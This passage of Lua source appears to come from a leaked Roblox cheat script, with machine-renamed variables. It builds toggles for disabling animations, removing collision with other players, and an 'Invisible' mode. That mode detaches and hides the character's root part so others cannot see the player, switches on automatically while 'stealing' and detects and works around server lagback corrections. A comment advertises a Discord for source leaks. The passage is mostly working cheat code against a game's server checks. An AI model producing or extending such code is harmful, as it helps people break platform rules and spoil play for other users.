		local connection2 = nil
		local connection3 = nil
		local value204 = nil
		local tbl46 = {}

		local function func284(param75)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
			if not character_ or not character_:IsA("Tool") then
				return false
			end
			local animation = param75.Animation
			local lowered5 = string.lower(tostring(param75.Name or ""))
			local lowered6 = string.lower(tostring(animation and animation.Name or ""))
			local priority = param75.Priority
			local flag196 = priority == Enum.AnimationPriority.Action or priority == Enum.AnimationPriority.Action2 or priority == Enum.AnimationPriority.Action3 or priority == Enum.AnimationPriority.Action4
			local foundAt2 = string.find(lowered5, "tool", 1, true) ~= nil or string.find(lowered5, "paint", 1, true) ~= nil or string.find(lowered5, "gun", 1, true) ~= nil or string.find(lowered6, "tool", 1, true) ~= nil or string.find(lowered6, "paint", 1, true) ~= nil or string.find(lowered6, "gun", 1, true) ~= nil
			return foundAt2 or flag196, foundAt2
		end

		local function func285()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		local function func286()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end

		local function func287(obj63, param76)
			local entry12 = tbl46[obj63]
			if not entry12 then
				return
			end
			tbl46[obj63] = nil

			if entry12.WeightConnection then
				entry12.WeightConnection:Disconnect()
			end

			if entry12.StoppedConnection then
				entry12.StoppedConnection:Disconnect()
			end

			if param76 then
				pcall(function()
					if obj63.IsPlaying then
						obj63:AdjustWeight(entry12.DesiredWeight, 0.1)
					end
				end)
			end
		end

		local function func288(param77)
			local list33 = {}

			for k in pairs(tbl46) do
				list33[#list33 + 1] = k
			end

			for _, item41 in ipairs(list33) do
				func287(item41, param77)
			end
		end

		local function func289(obj64)
			if not flag195 then
				return
			end
			local value205, value206 = func284(obj64)

			if value205 then
				if tbl46[obj64] then
					func287(obj64, true)
				elseif value206 then
					pcall(function()
						if obj64.IsPlaying and obj64.WeightTarget <= 0 and obj64.WeightCurrent <= 0.01 then
							obj64:AdjustWeight(1, 0.05)
						end
					end)
				end

				return
			end

			if tbl46[obj64] then
				return
			end
			local n3 = 1

			pcall(function()
				if obj64.WeightTarget > 0 then
					n3 = obj64.WeightTarget
				elseif obj64.WeightCurrent > 0 then
					n3 = obj64.WeightCurrent
				end
			end)

			local tbl47 = { Applying = false, DesiredWeight = n3 }
			tbl46[obj64] = tbl47

			tbl47.WeightConnection = obj64:GetPropertyChangedSignal("WeightTarget"):Connect(function()
				if not flag195 or tbl47.Applying then
					return
				end

				if func284(obj64) then
					func287(obj64, true)
					return
				end

				pcall(function()
					local weightTarget = obj64.WeightTarget

					if weightTarget > 0 then
						tbl47.DesiredWeight = weightTarget
					end

					tbl47.Applying = true
					obj64:AdjustWeight(0, 0)
				end)

				tbl47.Applying = false
			end)

			tbl47.StoppedConnection = obj64.Stopped:Connect(function()
				func287(obj64, false)
			end)

			tbl47.Applying = true

			pcall(function()
				obj64:AdjustWeight(0, 0)
			end)

			tbl47.Applying = false
		end

		local function func290(list34)
			if not flag195 or list34 ~= value204 then
				return
			end

			for _, getPlayingAnimationTrack in ipairs(list34:GetPlayingAnimationTracks()) do
				func289(getPlayingAnimationTrack)
			end
		end

		local function func291(param78)
			func285()
			func286()
			func288(param78)
			value204 = nil
		end

		local function func292(obj65)
			n2 += 1
			local flag197 = n2

			task.spawn(function()
				local humanoid = obj65:FindFirstChildOfClass("Humanoid") or obj65:WaitForChild("Humanoid", 5)
				if not flag195 or n2 ~= flag197 or obj65 ~= localPlayer.Character or not humanoid then
					return
				end
				local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 5)
				if not flag195 or n2 ~= flag197 or obj65 ~= localPlayer.Character or not animator then
					return
				end
				func291(false)
				value204 = animator
				func290(animator)

				connection3 = animator.AnimationPlayed:Connect(function(param79)
					if flag195 and value204 == animator then
						func289(param79)
					end
				end)

				local function func293(child)
					if not child:IsA("Tool") then
						return
					end

					task.defer(function()
						if flag195 and n2 == flag197 and obj65 == localPlayer.Character and value204 == animator then
							func290(animator)
						end
					end)
				end

				connection = obj65.ChildAdded:Connect(func293)
				connection2 = obj65.ChildRemoved:Connect(func293)
			end)
		end

		local connection4 = localPlayer.CharacterAdded:Connect(function(character_)
			if flag195 then
				func292(character_)
			end
		end)

		func2(function()
			flag195 = false
			n2 += 1
			func291(true)

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end
		end)

		obj11:CreateToggle({
			Name = "No Animation",
			Default = true,
			Callback = function(value)
				flag195 = value == true

				if flag195 then
					local character_ = localPlayer.Character

					if character_ then
						func292(character_)
					end
				else
					n2 += 1
					func291(true)
				end
			end,
		})
	end

	do
		local flag198 = false
		local n2 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local tbl48 = {}
		local tbl49 = {}
		local obj2 = setmetatable({}, { __mode = "k" })

		local function func294(obj66)
			local flag199 = obj66 and obj66:GetAttribute("Web") == true
			local flag200

			if flag199 then
				local name = localPlayer.Name
				flag200 = obj66:GetAttribute("WebTo") == name
			else
				flag200 = flag199
			end

			return flag200
		end

		local function func295(instance40, param80)
			if not flag198 or not instance40.Parent or param80.Applying then
				return
			end
			local canCollide = false

			if func294(param80.OwnerPlayer) then
				canCollide = param80.OriginalCanCollide
			end

			if instance40.CanCollide ~= canCollide then
				param80.Applying = true

				pcall(function()
					instance40.CanCollide = canCollide
				end)

				param80.Applying = false
			end
		end

		local function func296(instance41, flag201)
			local entry13 = obj2[instance41]
			if not entry13 then
				return
			end
			obj2[instance41] = nil

			if entry13.CollisionConnection then
				entry13.CollisionConnection:Disconnect()
			end

			if entry13.DestroyingConnection then
				entry13.DestroyingConnection:Disconnect()
			end

			if flag201 and instance41.Parent then
				pcall(function()
					entry13.Applying = true
					instance41.CanCollide = entry13.OriginalCanCollide
					entry13.Applying = false
				end)
			end
		end

		local function func297(instance42, ownerPlayer)
			if not flag198 then
				return
			end
			local entry14 = obj2[instance42]

			if entry14 then
				entry14.OwnerPlayer = ownerPlayer
				func295(instance42, entry14)
				return
			end

			local tbl50 = { Applying = false, OwnerPlayer = ownerPlayer, OriginalCanCollide = instance42.CanCollide }
			obj2[instance42] = tbl50

			tbl50.CollisionConnection = instance42:GetPropertyChangedSignal("CanCollide"):Connect(function()
				if flag198 and not tbl50.Applying and instance42.Parent then
					func295(instance42, tbl50)
				end
			end)

			tbl50.DestroyingConnection = instance42.Destroying:Connect(function()
				func296(instance42, false)
			end)

			func295(instance42, tbl50)
		end

		local function func298(param81, ownerPlayer)
			if not flag198 then
				return
			end
			local entry15 = obj2[param81]

			if not entry15 then
				func297(param81, ownerPlayer)
			else
				entry15.OwnerPlayer = ownerPlayer
				func295(param81, entry15)
			end
		end

		local function func299(player5, param82)
			if player5.DescendantAddedConnection then
				player5.DescendantAddedConnection:Disconnect()
				player5.DescendantAddedConnection = nil
			end

			if player5.DescendantRemovingConnection then
				player5.DescendantRemovingConnection:Disconnect()
				player5.DescendantRemovingConnection = nil
			end

			local character_ = player5.Character
			player5.Character = nil
			if not character_ then
				return
			end
			local list35 = {}

			for k in pairs(obj2) do
				if k:IsDescendantOf(character_) then
					list35[#list35 + 1] = k
				end
			end

			for _, item42 in ipairs(list35) do
				func296(item42, param82)
			end
		end

		local function func300(flag202, character_)
			local entry16 = tbl48[flag202]
			if not flag198 or not entry16 or flag202 == localPlayer then
				return
			end
			func299(entry16, false)
			entry16.Character = character_

			for _, descendant in ipairs(character_:GetDescendants()) do
				if descendant:IsA("BasePart") then
					func298(descendant, flag202)
				end
			end

			entry16.DescendantAddedConnection = character_.DescendantAdded:Connect(function(descendant)
				if flag198 and descendant:IsA("BasePart") then
					func298(descendant, flag202)
				end
			end)

			entry16.DescendantRemovingConnection = character_.DescendantRemoving:Connect(function(descendant)
				if descendant:IsA("BasePart") then
					func296(descendant, false)
				end
			end)
		end

		local function func301(instance43)
			if not instance43:IsA("Model") then
				return false
			end
			return string.sub(string.lower(instance43.Name), -6) == "_clone"
		end

		local function func302(param83, param84)
			local entry17 = tbl49[param83]
			if not entry17 then
				return
			end
			tbl49[param83] = nil

			if entry17.DestroyingConnection then
				entry17.DestroyingConnection:Disconnect()
				entry17.DestroyingConnection = nil
			end

			func299(entry17, param84)
		end

		local function func303(list36)
			if not flag198 or tbl49[list36] or not func301(list36) then
				return
			end
			local tbl51 = { Character = list36 }
			tbl49[list36] = tbl51

			for _, descendant in ipairs(list36:GetDescendants()) do
				if descendant:IsA("BasePart") then
					func298(descendant, nil)
				end
			end

			tbl51.DescendantAddedConnection = list36.DescendantAdded:Connect(function(descendant)
				if flag198 and descendant:IsA("BasePart") then
					func298(descendant, nil)
				end
			end)

			tbl51.DescendantRemovingConnection = list36.DescendantRemoving:Connect(function(descendant)
				if descendant:IsA("BasePart") then
					func296(descendant, false)
				end
			end)

			tbl51.DestroyingConnection = list36.Destroying:Connect(function()
				func302(list36, false)
			end)
		end

		local function func304()
			for _, child in ipairs(Workspace:GetChildren()) do
				if func301(child) then
					func303(child)

					for _, descendant in ipairs(child:GetDescendants()) do
						if descendant:IsA("BasePart") then
							func298(descendant, nil)
						end
					end
				end
			end

			local list37 = {}

			for k in pairs(tbl49) do
				if not k:IsDescendantOf(Workspace) then
					list37[#list37 + 1] = k
				end
			end

			for _, item43 in ipairs(list37) do
				func302(item43, false)
			end
		end

		local function func305(param85)
			for k, value207 in pairs(obj2) do
				if value207.OwnerPlayer == param85 then
					func295(k, value207)
				end
			end
		end

		local function func306(param86, param87)
			local entry18 = tbl48[param86]
			if not entry18 then
				return
			end
			tbl48[param86] = nil
			func299(entry18, param87)

			if entry18.CharacterAddedConnection then
				entry18.CharacterAddedConnection:Disconnect()
			end

			if entry18.CharacterRemovingConnection then
				entry18.CharacterRemovingConnection:Disconnect()
			end

			if entry18.WebConnection then
				entry18.WebConnection:Disconnect()
			end

			if entry18.WebTargetConnection then
				entry18.WebTargetConnection:Disconnect()
			end
		end

		local function func307(player6)
			if player6 == localPlayer or tbl48[player6] then
				return
			end
			local tbl52 = {}
			tbl48[player6] = tbl52

			tbl52.WebConnection = player6:GetAttributeChangedSignal("Web"):Connect(function()
				if flag198 then
					func305(player6)
				end
			end)

			tbl52.WebTargetConnection = player6:GetAttributeChangedSignal("WebTo"):Connect(function()
				if flag198 then
					func305(player6)
				end
			end)

			tbl52.CharacterAddedConnection = player6.CharacterAdded:Connect(function(character_)
				if flag198 then
					func300(player6, character_)
				end
			end)

			tbl52.CharacterRemovingConnection = player6.CharacterRemoving:Connect(function(character_)
				if tbl52.Character == character_ then
					func299(tbl52, false)
				end
			end)

			if player6.Character then
				func300(player6, player6.Character)
			end
		end

		local function func308()
			flag198 = false
			n2 += 1

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			local list38 = {}

			for k in pairs(tbl48) do
				list38[#list38 + 1] = k
			end

			for _, item44 in ipairs(list38) do
				func306(item44, true)
			end

			local list39 = {}

			for k in pairs(tbl49) do
				list39[#list39 + 1] = k
			end

			for _, item45 in ipairs(list39) do
				func302(item45, true)
			end

			local list40 = {}

			for k in pairs(obj2) do
				list40[#list40 + 1] = k
			end

			for _, item46 in ipairs(list40) do
				func296(item46, true)
			end
		end

		local function func309()
			n2 += 1
			local value208 = n2

			task.spawn(function()
				while flag198 and n2 == value208 do
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= localPlayer then
							pcall(function()
								func307(player)
								local entry19 = tbl48[player]
								local character_ = player.Character

								if entry19 and character_ then
									if entry19.Character ~= character_ then
										func300(player, character_)
									else
										for _, descendant in ipairs(character_:GetDescendants()) do
											if descendant:IsA("BasePart") then
												func298(descendant, player)
											end
										end
									end
								end
							end)
						end
					end

					func304()
					task.wait(1)
				end
			end)
		end

		local function func310()
			if flag198 then
				return
			end
			flag198 = true

			connection = Players.PlayerAdded:Connect(function(player)
				func307(player)

				task.defer(function()
					local entry20 = tbl48[player]
					local character_ = player.Character

					if flag198 and entry20 and character_ and entry20.Character ~= character_ then
						func300(player, character_)
					end
				end)
			end)

			connection2 = Players.PlayerRemoving:Connect(function(player)
				func306(player, false)
			end)

			connection3 = Workspace.ChildAdded:Connect(function(child)
				if flag198 and func301(child) then
					func303(child)
				end
			end)

			connection4 = Workspace.ChildRemoved:Connect(function(child)
				if tbl49[child] then
					func302(child, false)
				end
			end)

			for _, player in ipairs(Players:GetPlayers()) do
				func307(player)
			end

			func304()
			func309()
		end

		func2(func308)

		obj11:CreateToggle({
			Name = "Disable Player Collision",
			Note = "Lets you move through other players and player clones without being blocked.",
			Default = true,
			Callback = function(value)
				if value then
					func310()
				else
					func308()
				end
			end,
		})
	end

	local animationId
	animationId = "rbxassetid://18537363391"
	local n2
	n2 = 5
	local n3
	n3 = 1.5
	local n4
	n4 = 0.04
	local flag203, flag204, flag205, flag206, flag207, flag208, n5, n6, clone, humanoidRootPart
	local flag209, n7

	do
		local n8 = 0.01
		flag203 = false
		flag204 = false
		flag205 = false
		flag206 = true
		flag207 = false
		flag208 = false
		n5 = 0.09
		n6 = 225
		clone = nil
		humanoidRootPart = nil
		flag209 = nil
		local hipHeight = nil
		local value209 = nil
		local n9 = 0
		n7 = 0
		local n10 = 0
		local list41 = {}
		local value210 = nil
		local n11 = 0
		local value211 = nil
		local n12 = 0
		local n13 = 0
		local value212 = nil
		local n14 = 0
		local createSlider = nil

		local function func311(connection11)
			if connection11 and connection11.Connected then
				connection11:Disconnect()
			end
		end

		local function func312()
			for _, item47 in ipairs(list41) do
				func311(item47)
			end

			table.clear(list41)
		end

		local function func313(param88)
			list41[#list41 + 1] = param88
			return param88
		end

		local function func314(humanoid4)
			if not humanoid4 or tbl2.ProtectedHumanoid ~= humanoid4 or humanoid4.Health <= 0 then
				return false
			end

			local ok, result = pcall(function()
				return humanoid4.BreakJointsOnDeath == false and humanoid4.RequiresNeck == false and humanoid4:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end)

			return ok and result == true
		end

		local function func315(list42, part14)
			for _, descendant in ipairs(list42:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1

					if not (part0 and not part0:IsDescendantOf(list42)) then
						local flag210 = part1 and not part1:IsDescendantOf(list42)
						local value213 = nil
						local value214 = nil

						if flag210 then
							local value215 = part0
							part0 = part1
							part1 = value215
						else
							part0 = value213
							part1 = value214
						end
					end

					if part0 and part0:IsA("BasePart") and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(list42) and (part0.Position - part14.Position).Magnitude <= 5 then
						return part0, part1
					end
				end
			end

			return nil
		end

		local function func316(param89)
			if localPlayer:GetAttribute("Stealing") ~= true then
				return nil
			end
			local character_ = localPlayer.Character
			local list43 = { param89 }

			if humanoidRootPart and humanoidRootPart.Parent and humanoidRootPart ~= param89 then
				list43[#list43 + 1] = humanoidRootPart
			end

			local huge = math.huge
			local value216 = nil

			for _, child in ipairs(Workspace:GetChildren()) do
				if child:IsA("Model") and child ~= character_ and not Players:GetPlayerFromCharacter(child) and child.Name:sub(-6) ~= "_Clone" then
					local rootPart = child:FindFirstChild("RootPart") or child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")

					if rootPart and rootPart:IsA("BasePart") then
						for i_, item48 in ipairs(list43) do
							local flag211, value217 = func315(child, item48)

							if flag211 and value217 then
								local value218 = item48.CFrame:PointToObjectSpace(flag211.Position)
								local magnitude = (value217.Position - item48.Position).Magnitude

								if math.abs(value218.X) <= 5 and value218.Y >= -3 and value218.Y <= 7 and value218.Z >= -7 and value218.Z <= 4 and magnitude <= 14 then
									local n15 = (flag211.Position - item48.Position).Magnitude + magnitude * 0.05 + (i_ - 1) * 0.01

									if n15 < huge then
										huge = n15
										value216 = child
									end
								end
							end
						end
					end
				end
			end

			return value216
		end

		local function func317()
			if localPlayer:GetAttribute("Stealing") == true and value211 and value211.Parent then
				return value211
			end
			return nil
		end

		local function func318()
			n12 += 1
			local flag212 = n12
			value211 = nil
			value212 = nil
			if not flag1 or not flag204 or not flag208 or localPlayer:GetAttribute("Stealing") ~= true then
				return
			end

			task.spawn(function()
				while flag1 and flag212 == n12 and flag204 and flag208 and localPlayer:GetAttribute("Stealing") == true do
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

					if character_ then
						local value219 = func316(character_)
						if value219 then
							value211 = value219
							return
						end
					end

					task.wait(0.15)
				end
			end)
		end

		local function func319(part15, param90)
			local raycastParams = RaycastParams.new()
			raycastParams.FilterType = Enum.RaycastFilterType.Exclude
			raycastParams.IgnoreWater = true
			raycastParams.FilterDescendantsInstances = { localPlayer.Character, param90, humanoidRootPart }
			local hit = Workspace:Raycast(part15.Position + Vector3.new(0, 8, 0), Vector3.new(0, -50, 0), raycastParams)
			return hit and hit.Position.Y or nil
		end

		local function func320(num32, num33)
			return math.abs((num32 - num33 + 180) % 360 - 180)
		end

		local function func321(part16, param91)
			local result22 = func317()
			if not result22 or not humanoidRootPart or not humanoidRootPart.Parent then
				value212 = nil
				return
			end
			local num34 = func319(part16, result22)
			if not num34 then
				return
			end

			local ok, result, result2 = pcall(function()
				local boundingBox, value220 = result22:GetBoundingBox()
				return boundingBox, value220
			end)

			if not ok or not result or not result2 then
				return
			end
			local tbl53 = {}

			for i_ = -1, 1, 2 do
				for i_2 = -1, 1, 2 do
					for i_3 = -1, 1, 2 do
						local n15 = #tbl53 + 1
						local cFrame = humanoidRootPart.CFrame
						local pointToObjectSpace = cFrame.PointToObjectSpace
						local num35 = result:PointToWorldSpace(Vector3.new(result2.X * 0.5 * i_, result2.Y * 0.5 * i_2, result2.Z * 0.5 * i_3))
						tbl53[n15] = pointToObjectSpace(cFrame, num35)
					end
				end
			end

			local n15 = part16.CFrame - Vector3.new(0, param91.HipHeight + part16.Size.Y * 0.5 - 1 + n5, 0)
			local n16 = n6 % 360
			local huge = math.huge
			local value221 = n16

			for i_ = 0, 13 do
				local n17 = 217 + i_
				local n18 = n15 * CFrame.Angles(math.rad(n17), 0, 0)
				local list44 = {}
				local n19 = -math.huge

				for _, item49 in ipairs(tbl53) do
					local y = n18:PointToWorldSpace(item49).Y
					list44[#list44 + 1] = y

					if n19 < y then
						n19 = y
					end
				end

				local n20 = n19 - num34
				local value222, value223, value224 = ipairs(list44)
				local n21 = 0
				local n22 = 0
				local n23 = 0

				for _, value225 in value222, value223, value224 do
					local n24 = value225 - num34

					if n8 < n24 then
						n21 += 1
						n22 += n24
					end

					if n19 - value225 <= 0.035 then
						n23 += 1
					end
				end

				local n24

				if n21 == 0 then
					n24 = n20 * 100 + func320(n17, n16) * 0.001
				else
					n24 = n21 * 1000 + n23 * 100 + math.max(n20, 0) * 50 + n22 * 10 + func320(n17, n16) * 0.001
				end

				if n24 < huge then
					huge = n24
					value221 = n17
				end
			end

			value212 = value221
		end

		local function func322(num36, num37, num38)
			return (num36 + ((num37 - num36 + 180) % 360 - 180) * num38) % 360
		end

		local function func323()
			local obj67 = Workspace:FindFirstChild(localPlayer.Name)
			if not obj67 then
				return
			end
			local doubleRig = obj67:FindFirstChild("DoubleRig")

			if doubleRig then
				doubleRig:Destroy()
			end

			local constraints = obj67:FindFirstChild("Constraints")

			if constraints then
				constraints:Destroy()
			end

			func313(obj67.ChildAdded:Connect(function(child)
				if child.Name == "DoubleRig" or child.Name == "Constraints" then
					task.defer(function()
						if flag204 and child.Parent then
							child:Destroy()
						end
					end)
				end
			end))
		end

		local function func324()
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or not func314(humanoid) then
				return false
			end
			hipHeight = humanoid.HipHeight
			humanoidRootPart = character_:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart or not humanoidRootPart.Parent then
				return false
			end
			flag209 = character_
			local model = Instance.new("Model")
			model.Parent = game
			character_.Parent = model
			clone = humanoidRootPart:Clone()
			clone.Parent = character_
			humanoidRootPart.Parent = Workspace.CurrentCamera
			clone.CFrame = humanoidRootPart.CFrame
			character_.PrimaryPart = clone
			character_.Parent = Workspace

			for _, descendant in ipairs(character_:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
					if descendant.Part0 == humanoidRootPart then
						descendant.Part0 = clone
					end

					if descendant.Part1 == humanoidRootPart then
						descendant.Part1 = clone
					end
				end
			end

			model:Destroy()
			return true
		end

		local function func325()
			local obj68 = flag209
			if not humanoidRootPart or not humanoidRootPart:IsDescendantOf(game) or not obj68 then
				return false
			end

			if obj68 ~= localPlayer.Character or obj68.Parent ~= Workspace then
				if clone and clone.Parent then
					pcall(function()
						clone:Destroy()
					end)
				end

				if humanoidRootPart and humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart:Destroy()
					end)
				end

				return false
			end

			local ok = pcall(function()
				local model = Instance.new("Model")
				model.Parent = game
				obj68.Parent = model
				humanoidRootPart.Parent = obj68
				obj68.PrimaryPart = humanoidRootPart
				obj68.Parent = Workspace
				humanoidRootPart.CanCollide = true

				for _, descendant in ipairs(obj68:GetDescendants()) do
					if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
						if descendant.Part0 == clone then
							descendant.Part0 = humanoidRootPart
						end

						if descendant.Part1 == clone then
							descendant.Part1 = humanoidRootPart
						end
					end
				end

				if clone then
					local cFrame = clone.CFrame
					clone:Destroy()
					clone = nil
					humanoidRootPart.CFrame = cFrame
				end

				local humanoid = obj68:FindFirstChildOfClass("Humanoid")

				if humanoid and hipHeight ~= nil then
					humanoid.HipHeight = hipHeight
				end

				model:Destroy()
			end)

			if not ok and humanoidRootPart and humanoidRootPart.Parent then
				pcall(function()
					humanoidRootPart:Destroy()
				end)
			end

			return ok
		end

		local value226 = nil

		value226 = function()
			if not flag204 then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 then
				return
			end
			local animation = Instance.new("Animation")
			animation.AnimationId = animationId
			local obj69 = (humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)):LoadAnimation(animation)
			animation:Destroy()
			value209 = obj69
			obj69.Priority = Enum.AnimationPriority.Action4
			obj69:Play(0, 1, 0)

			func313(obj69.Stopped:Connect(function()
				if flag204 and value209 == obj69 then
					value226()
				end
			end))

			task.defer(function()
				if flag204 and value209 == obj69 then
					pcall(function()
						obj69.TimePosition = 0.7
					end)

					task.delay(1, function()
						if flag204 and value209 == obj69 then
							pcall(function()
								obj69:AdjustSpeed(math.huge)
							end)
						end
					end)
				end
			end)
		end

		local flag213 = false

		local function func326(flag214)
			if flag214 ~= false then
				n7 += 1
				flag213 = false
			end

			n9 += 1
			n10 += 1
			flag204 = false
			n12 += 1
			value211 = nil
			value212 = nil
			n13 = 0
			value210 = nil

			if value209 then
				pcall(function()
					value209:Stop()
				end)

				pcall(function()
					value209:Destroy()
				end)

				value209 = nil
			end

			func312()
			func325()
			clone = nil
			humanoidRootPart = nil
			flag209 = nil
			hipHeight = nil
		end

		local value227 = nil

		local function func327()
			if flag213 then
				return
			end
			flag213 = true
			n7 += 1
			local flag215 = n7

			task.spawn(function()
				func326(false)
				local character_ = localPlayer.Character
				-- https://discord.gg/x7YbZeezpm | S​o​u​r​c​e​ ​L​e​a​k​ ​(​S​L​)

				if character_ then
					character_ = character_.PrimaryPart or character_:FindFirstChild("HumanoidRootPart")
				end

				character_ = character_ and character_.Position or nil
				local now = os.clock()
				local n15 = 0

				while true do
					if flag1 and flag215 == n7 and flag203 and os.clock() - now < 3.5 then
						local result = RunService.Heartbeat:Wait()

						if not (flag215 ~= n7 or not flag203) then
							local character_2 = localPlayer.Character
							local primaryPart = character_2 and (character_2.PrimaryPart or character_2:FindFirstChild("HumanoidRootPart"))
							character_2 = character_2 and character_2:FindFirstChildOfClass("Humanoid")

							if primaryPart and character_2 and character_2.Health > 0 then
								local position = primaryPart.Position

								if character_ then
									if (position - character_).Magnitude > 4 then
										n15 = 0
										character_ = position
										continue
									else
										n15 += result
										local n16 = os.clock() - now
										if not (n15 >= 0.6 and n16 >= 0.7) then
											character_ = position
											continue
										end
									end
								else
									character_ = position
									continue
								end
							else
								n15 = 0
								continue
							end
						end
					end

					break
				end

				flag213 = false

				if flag215 == n7 and flag1 and flag203 then
					if value227 then
						value227()
					end
				end
			end)
		end

		value227 = function()
			if flag204 then
				return true
			end

			if humanoidRootPart or clone or flag209 then
				func326()
			end

			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart2 = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not character_ or character_.Parent ~= Workspace or not humanoid or humanoid.Health <= 0 or not humanoidRootPart2 or humanoidRootPart2.Parent ~= character_ or character_.PrimaryPart ~= humanoidRootPart2 then
				return false
			end
			n9 += 1
			local flag216 = n9
			func312()
			func323()
			if not func324() then
				func312()
				return false
			end
			flag204 = true
			task.wait(0.1)
			if flag216 ~= n9 or not flag204 then
				return false
			end
			value226()
			func318()

			func313(RunService.PreSimulation:Connect(function()
				local character_2 = localPlayer.Character
				local humanoid2 = character_2 and character_2:FindFirstChildOfClass("Humanoid")
				character_2 = character_2 and character_2.PrimaryPart
				if not flag204 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart or not humanoidRootPart.Parent or not character_2 then
					return
				end

				if flag208 and localPlayer:GetAttribute("Stealing") == true then
					local now = os.clock()

					if n4 <= now - n13 then
						n13 = now
						func321(character_2, humanoid2)
					end

					if value212 ~= nil then
						n6 = func322(n6, value212, 0.42)
					end

					if createSlider and now >= n14 then
						n14 = now + 0.1
						createSlider:Set(math.floor(n6 + 0.5), false)
					end
				else
					value211 = nil
					value212 = nil
				end

				local cframe = CFrame.Angles
				humanoidRootPart.CFrame = (character_2.CFrame - Vector3.new(0, humanoid2.HipHeight + character_2.Size.Y * 0.5 - 1 + n5, 0)) * cframe(math.rad(n6), 0, 0)
				humanoidRootPart.Velocity = character_2.Velocity
				humanoidRootPart.CanCollide = false
			end))

			value210 = nil

			func313(RunService.PreAnimation:Connect(function()
				if not flag204 or not humanoidRootPart or not humanoidRootPart.Parent then
					value210 = nil
					return
				end
				local position = humanoidRootPart.Position

				if value210 then
					local magnitude = (position - value210).Magnitude
					local now = os.clock()

					if magnitude > n2 and now - n11 > n3 then
						n11 = now

						if flag206 then
							obj1.Notify("Lagback detected", "Invisible position was corrected by the server.", 5)
						end

						if flag207 then
							func327()
						end
					end
				end

				value210 = position
			end))

			return true
		end

		local function func328(instance44, delay2)
			n10 += 1
			local flag217 = n10

			task.spawn(function()
				if delay2 and delay2 > 0 then
					task.wait(delay2)
				end

				for i_ = 1, 50 do
					if not flag1 or flag217 ~= n10 or not flag203 or instance44 ~= localPlayer.Character then
						return
					end
					local humanoid = instance44 and instance44:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart2 = instance44 and instance44:FindFirstChild("HumanoidRootPart")

					if humanoid and func314(humanoid) and humanoidRootPart2 and humanoidRootPart2.Parent == instance44 then
						if value227() then
							return
						end
					end

					task.wait(0.1)
				end
			end)
		end

		local obj70 = obj12:CreateToggle({
			Name = "Invisible",
			Default = false,
			Keybind = Enum.KeyCode.U,
			Callback = function(value)
				flag203 = value == true

				if flag203 then
					func328(localPlayer.Character, 0.15)
				else
					func326()
				end
			end,
		})

		local function func329()
			if not flag205 or not obj70 then
				return
			end
			local flag218 = localPlayer:GetAttribute("Stealing") == true
			if obj70:Get() ~= flag218 then
				obj70:Set(flag218, true)
				return
			end

			if flag218 then
				flag203 = true

				if not flag204 then
					func328(localPlayer.Character, 0.05)
				end
			elseif flag203 or flag204 or humanoidRootPart ~= nil or clone ~= nil then
				flag203 = false
				func326()
			end
		end

		obj12:CreateToggle({
			Name = "Auto Invisible On Steal",
			Default = false,
			Callback = function(value)
				flag205 = value == true

				if flag205 then
					func329()
				end
			end,
		})

		obj12:CreateToggle({
			Name = "Auto Rotation",
			Default = true,
			Callback = function(value)
				flag208 = value == true
				n13 = 0
				func318()
			end,
		})

		createSlider = obj12.CreateSlider

		createSlider = createSlider(obj12, {
			Name = "Rotation",
			Min = 180,
			Max = 300,
			Default = 279,
			AllowDecimals = false,
			Increment = 1,
			Callback = function(value)
				n6 = math.clamp(math.floor((tonumber(value) or 225) + 0.5), 180, 300)
			end,
		})

		obj12:CreateSlider({
			Name = "Depth",
			Min = 0,
			Max = 0.7,
			Default = 0.12,
			AllowDecimals = true,
			DecimalPlaces = 2,
			Increment = 0.01,
			Callback = function(value)
				n5 = math.clamp(tonumber(value) or 0.09, 0, 0.7)
			end,
		})

		obj12:CreateToggle({
			Name = "Lagback Detect",
			Default = true,
			Callback = function(value)
				flag206 = value == true
			end,
		})

		obj12:CreateToggle({
			Name = "Auto Fix Lagback",
			Default = false,
			Callback = function(value)
				flag207 = value == true

				if not flag207 then
					n7 += 1
					flag213 = false
				end
			end,
		})

		tbl1.IsActive = function()
			return flag204 == true
		end

		tbl1.GetDrop = function()
			local character_ = flag209 or localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_.PrimaryPart or character_:FindFirstChild("HumanoidRootPart")
			end

			return (humanoid and humanoid.HipHeight and humanoid.HipHeight > 0 and humanoid.HipHeight or 2) + (character_ and character_.Size and character_.Size.Y or 2) * 0.5 - 1 + n5
		end

		tbl1.SuspendForReset = function(flag219)
			local value228 = flag209
			local flag220

			if flag209 then
				flag220 = flag219
			else
